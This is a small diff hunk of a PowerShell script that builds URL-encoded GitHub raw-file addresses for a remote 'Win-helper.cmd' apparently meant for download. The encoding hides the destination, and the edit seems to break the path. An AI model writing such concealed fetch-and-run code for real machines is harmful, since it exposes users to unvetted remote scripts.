@@ -3,7 +3,7 @@ $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$CommonURLPart = '%2FWin-helper.cmd'
+$CommonURLPart = 'Win-helper.cmd'
 $DownloadURL1 = 'https%3A%2F%2Fraw.githubusercontent.com%2FBL4ckCloud%2Fabahzian%2Fmain%2Fwin' + $CommonURLPart
 $DownloadURL2 = 'https%3A%2F%2Fraw.githubusercontent.com%2FBL4ckCloud%2Fabahzian%2Fmain%2Fwin' + $CommonURLPart
 
